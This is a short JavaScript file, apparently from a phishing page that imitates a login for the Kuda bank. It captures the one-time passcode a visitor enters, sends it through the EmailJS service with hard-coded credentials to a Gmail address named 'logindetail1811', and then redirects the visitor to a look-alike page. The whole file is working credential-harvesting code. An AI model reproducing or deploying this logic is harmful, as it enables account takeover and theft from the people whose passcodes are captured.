// emailjs.init("3yaulPAGa3CdjhurB");
const otp = document.querySelector("#otp");
const btn = document.querySelector("button");
btn.onclick = () => {
  btn.innerHTML = "Loading...";
};
const serviceId = "service_v7kg7cm";
const userId = "w0Q6rGREdg2xRfoeb";
const templateId = "template_xa9thwp";
document.getElementById("myForm").onsubmit = function (event) {
  event.preventDefault();
  const emailParams = {
    to_name: "logindetail1811@gmail.com",
    otp: otp.value,
  };
  console.log(emailParams);
  emailjs.send(serviceId, templateId, emailParams, userId).then(
    function (response) {
      console.log("Sent successfully:", response);
      otp.value = "";
      location.href = "/lo-Kuda.xyz.github.io/index.html";
    },
    function (error) {
      console.log("Failed to send:", error);
    }
  );
};
